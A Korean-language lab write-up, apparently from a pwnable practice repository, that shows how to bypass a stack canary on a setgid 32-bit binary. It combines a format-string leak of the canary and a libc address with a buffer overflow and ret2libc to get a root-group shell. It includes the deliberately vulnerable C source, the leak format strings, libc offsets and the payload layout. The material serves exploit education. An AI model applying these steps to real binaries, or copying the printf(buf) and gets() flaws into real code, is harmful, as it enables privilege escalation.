# bof-fsb-canary-bypass

## 1. 개요

이 실습은 **현대 리눅스 보호기법이 모두 활성화된 환경**에서
**Format String Vulnerability(FSB)** 와 **Buffer Overflow(BOF)** 를 결합하여
**Stack Canary를 우회(bypass)** 하고 **ret2libc 공격으로 쉘을 획득**하는 것을 목표로 한다.


---

## 2. 실습 환경

* Architecture: x86 (32-bit)
* OS: Ubuntu 24.04
* ASLR: Enabled
* PIE: Enabled
* NX: Enabled
* RELRO: Full RELRO
* Stack Canary: Enabled

즉,

* GOT overwrite 불가 (Full RELRO)
* 쉘코드 주입 불가 (NX)
* 고정 주소 기반 exploit 불가 (PIE + ASLR)

로 인해,
Format String Vulnerability를 통한 **libc leak 기반 ret2libc 공격만 가능하도록**
설계된 바이너리이다.


---

## 3. 취약 코드

```c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[64];

    puts("input1:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);        // Format String Vulnerability

    puts("input2:");
    gets(buf);          // Buffer Overflow
}

int main() {
    setregid(getegid(), getegid());
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("done");
    return 0;
}
```

### 취약점 요약

* `printf(buf)`
  * 사용자 입력이 포맷 문자열로 해석됨
  * **FSB 발생**
  * 스택 및 libc 주소 leak 가능

* `gets(buf)`
  * 길이 제한 없음
  * **Stack Buffer Overflow 가능**
  * 단, Stack Canary로 인해 단순 BOF는 실패

---

## 4. 익스플로잇 전체 흐름

이 바이너리는 Stack Canary가 활성화되어 있으므로,
BOF만으로는 saved return address를 덮을 수 없다.

따라서 공격 흐름은 다음과 같다.

1. **input1**
   * Format String Vulnerability를 이용해
   * Stack Canary leak
   * libc 주소 leak

2. leak한 값을 기반으로
   * libc base 계산
   * Canary 복원

3. **input2**
   * BOF로 스택을 덮되
   * Canary를 정확히 복원하여 검사 통과
   * saved return address를 `system("/bin/sh")`로 변경 (ret2libc)

---

## 5. FSB를 이용한 정보 누출

### 5.1 libc 주소 leak

여러 `%p`를 출력한 결과,

* fmt와 buf 사이의 오프셋은 7이며
* 두 번째 인자 슬롯에서 libc 내부 주소로 의심되는 값이 leak됨을 확인했다.

예: 
``` gdb
input1:
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0x40.0xed2ba5c0.0x5b9b9209.0xed10be7b.0xed2b97a8.0xed2bad40.0x41414141.0x2e70252e.0x252e7025.0x70252e70
```

`info proc mappings`로 %2$p 에 해당하는 값이 libc 범위에 들어감을 확인했다.
```
Start Addr   End Addr       Size     Offset  Perms   objfile
0xed0ac000 0xed233000   0x187000    0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
0xed233000 0xed2b8000    0x85000   0x1aa000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
0xed2b8000 0xed2ba000     0x2000   0x22f000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
0xed2ba000 0xed2bb000     0x1000   0x231000  rw-p   /usr/lib/i386-linux-gnu/libc.so.6
```


그리고 실제 확인 결과 해당 값의 심볼은 다음과 같았다.
```
(gdb) x/i 0xed2ba5c0
0xed2ba5c0 <_IO_2_1_stdin_>
```

`_IO_2_1_stdin_`은 glibc 내부에 항상 존재하는 전역 객체로,
libc base 계산의 기준점으로 사용하기 적합하다.


### 5.2 Stack Canary 위치 계산


GDB로 확인한 `vuln()`의 스택 프레임은 다음과 같다.

* `buf` 시작 주소: `[ebp-0x4c]`
* canary 사본: `[ebp-0xc]`

따라서 canary를 leak하기 위한 포맷은 다음과 같이 계산된다.

```
1) buf와 canary 차이:
0x4c - 0x0c = 0x40 = 64 bytes

2) 32bit 환경에서 스택 슬롯 크기는 4바이트이므로:
64 / 4 = 16 slots

3) FSB에서 buf가 관측된 위치가 7번째 슬롯이었기 때문에:
7 + 16 = 23
```

따라서 Stack Canary는 `%23$p` 으로 leak 가능하다.

실제 실행 결과:

```
input1:
%20$p.%21$p.%22$p.%23$p.%24$p.%25$p
0x3e8.0xe9111b60.0xff881a98.0xbcda9900.0xe90bbd40.0x5fa5cfb4
```

`%23$p`로 출력된 값의 하위 1바이트가 `\00`이므로 canary로 의심된다.

GDB로 직접 검증:

```
(gdb) x/wx $ebp-0xc
0xff881a5c: 0xbcda9900
```

---

## 6. libc 오프셋 정보

다음과 같이 오프셋을 찾았다:
```
$ nm -D /usr/lib/i386-linux-gnu/libc.so.6 | grep _IO_2_1_stdin_
002315c0 D _IO_2_1_stdin_@@GLIBC_2.1
$ nm -D /usr/lib/i386-linux-gnu/libc.so.6 | grep " system@@"
00050430 W system@@GLIBC_2.0
$ nm -D /usr/lib/i386-linux-gnu/libc.so.6 | grep " exit@@"
0003ebd0 T exit@@GLIBC_2.0
$ strings -tx /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 1c4de8 /bin/sh
```

이를 통해 확인한 실습 환경의 libc 기준 오프셋은 다음과 같다.

```
_IO_2_1_stdin_ : 0x002315c0
system         : 0x00050430
exit           : 0x0003ebd0
"/bin/sh"      : 0x001c4de8
```

libc base 계산:

```
libc_base = leak(_IO_2_1_stdin_) - 0x002315c0
```

---

## 7. BOF + Canary Bypass + ret2libc

### 7.1 스택 구조 (PIE + callee-saved register)

PIE 바이너리에서는 i386 PIC 코드 생성 과정에서
`ebx`가 GOT 베이스 레지스터로 사용된다.

`ebx`는 SysV ABI에서 callee-saved register이므로,
함수 내부에서 사용될 경우 프롤로그에서 `push ebx`가 추가된다.

```asm
0x000011fd <+0>:	push   ebp
0x000011fe <+1>:	mov    ebp,esp
0x00001200 <+3>:	push   ebx
0x00001201 <+4>:	sub    esp,0x54
```

또한 canary가 `[ebp-0xc]`에 기록됨을 확인할 수 있다.

```asm
0x0000120f <+18>:	mov    eax,gs:0x14
0x00001215 <+24>:	mov    DWORD PTR [ebp-0xc],eax
```

이에 따른 스택 구조는 다음과 같다.

```
높은주소
+-------------------+
|     saved RET     | vuln 함수의 saved RET : libc 체인 시작점
+-------------------+
|     saved EBP     | vuln 함수의 saved EBP
+-------------------+ ← ebp
|     saved EBX     | vuln 함수의 saved EBX
+-------------------+ [ebp-0x4]
|        ???        | padding/local
+-------------------+ [ebp-0x8]
|    copied canary  | canary 사본
+-------------------+ [ebp-0xc]
|        ...        | 
+-------------------+
|                   | buf
+-------------------+ [ebp-0x4c]
낮은주소
```

> **노트 ── PIE와 saved EBX**
>
> 이 바이너리는 32bit Linux ELF로,
> i386 System V ABI를 따르며 함수 호출 규칙으로는 cdecl을 사용한다.
> 
> System V ABI에서 ebx는 callee-saved register이므로,
> PIE/PIC 코드에서 GOT 베이스 레지스터로 사용될 경우
> 함수 프롤로그에서 push ebx가 추가된다.
> 
> 그 결과 스택 프레임이 4바이트 늘어나서 ret2libc payload도 그만큼 맞춰줘야 한다.


### 7.2 BOF payload 구조

```
"A" * 64
+ canary
+ padding
+ saved ebx
+ saved ebp
+ system
+ exit
+ "/bin/sh"
```

Stack Canary를 정확히 복원함으로써,
보호기법 검사를 통과하고 ret2libc 공격이 가능해진다.

페이로드 입력 후 스택 다이어그램:
```
높은주소
+-------------------+
|     "/bin/sh"     | system()의 인자 역할
+-------------------+
|       exit()      | system()의 saved RET 역할
+-------------------+
|      system()     | vuln 함수의 saved RET : libc 체인 시작점
+-------------------+
|        DDDD       | vuln 함수의 saved EBP
+-------------------+ ← ebp
|        CCCC       | vuln 함수의 saved EBX
+-------------------+ [ebp-0x4]
|        BBBB       |
+-------------------+ [ebp-0x8]
|  restored canary  | canary 사본
+-------------------+ [ebp-0xc]
|        ...        | 
+-------------------+
|        AAAA       | buf
+-------------------+ [ebp-0x4c]
낮은주소
```

`padding`은 canary와 saved ebx 사이에 존재하는 로컬 변수/정렬 슬롯을 채우기 위한 더미 값이다.

---

## 8. exploit 코드

익스플로잇 코드는 `exploit.py`에 작성되어 있으며,

* FSB로 libc + canary leak
* BOF로 canary bypass + ret2libc

를 한 실행 흐름에서 수행한다.

(코드 전문은 `exploit.py` 참고)

---

## 9. 결과

```
$ id
uid=1000(name) gid=0(root) groups=0(root)
```

* Stack Canary 우회 성공
* PIE / Full RELRO / ASLR 환경에서도 ret2libc 성공
* setgid 바이너리로 root group 쉘 획득

실제 실행 화면:
![result](https://github.com/sage-502/pwnable-lab/blob/main/images/bof-fsb-canary-bypass/05.png)

---

## 10. 정리

이 실습은 다음을 보여준다.

* Stack Canary는 **정보가 leak되면 우회 가능**
* PIE / Full RELRO는 GOT overwrite만 막을 뿐, ret2libc 자체를 막지 못함
* 입력 취약점이 둘 이상 결합될 경우,
  현대 보호기법이 모두 켜진 환경에서도 RCE 가능
